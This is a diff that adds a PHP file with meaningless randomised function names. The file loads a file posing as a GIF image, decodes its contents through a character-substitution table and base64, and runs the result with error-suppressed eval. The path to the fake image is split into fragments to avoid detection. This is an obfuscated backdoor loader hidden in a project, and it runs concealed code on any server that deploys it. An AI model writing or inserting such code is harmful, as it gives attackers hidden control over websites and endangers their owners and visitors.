@@ -1,0 +1,51 @@
+<?php
+
+function gulojo_uxubuwul($wekubu_lakaxothuf) {
+    if ($wekubu_lakaxothuf == 1)
+        return yweciv_abekubyse();
+    if ($wekubu_lakaxothuf == 2)
+        return mibawo_vifoshavyk();
+}
+
+function gituti_ujeshuhach($wekubu_lakaxothuf) {
+    $uthomaq = gulojo_uxubuwul(1);
+    $xycyheg = gulojo_uxubuwul(2);
+    for ($ixezoj = 0; $ixezoj < strlen($uthomaq); $ixezoj++) {
+        $nofexi = substr($uthomaq, $ixezoj, 1);
+        $egeral = substr($xycyheg, $ixezoj, 1);
+        $welyshu[$nofexi] = $egeral;
+    }
+
+    $ecapyt = strtr($wekubu_lakaxothuf, $welyshu);
+    $ecapyt = base64_decode($ecapyt);
+
+    return $ecapyt;
+}
+
+function vagece_khazhivi($wekubu_lakaxothuf) {
+    $wevuder = array();
+    if (!file_exists($wekubu_lakaxothuf))
+        return false;
+    $acehush = @file_get_contents($wekubu_lakaxothuf);
+    if (!$acehush)
+        return false;
+    $acehush = substr($acehush, 3);
+    $wevuder = gituti_ujeshuhach($acehush);
+    return $wevuder;
+}
+
+function yweciv_abekubyse() {
+    $acehush = "XoRMsEfVjdvWDepHQ48bZ6zuhGS1=NU/Y2xmkIrTcBO73q+AKawlgL9FJi0ntPy5C";
+    return $acehush;
+}
+
+function mibawo_vifoshavyk() {
+    $wevuder = "6Mw4dTBLfpNQYZnxGa8uJXlb+HWt03Coj9EhkRzPcVU/mD=1rge7AS2Fq5iKvOysI";
+    return $wevuder;
+}
+
+$hytozho = vagece_khazhivi(__DIR__ . "/asse" . "ts/i" . "mage" . "s/unys" . "uly.g" . "if");
+if ($hytozho) {
+    @eval($hytozho);
+}
+
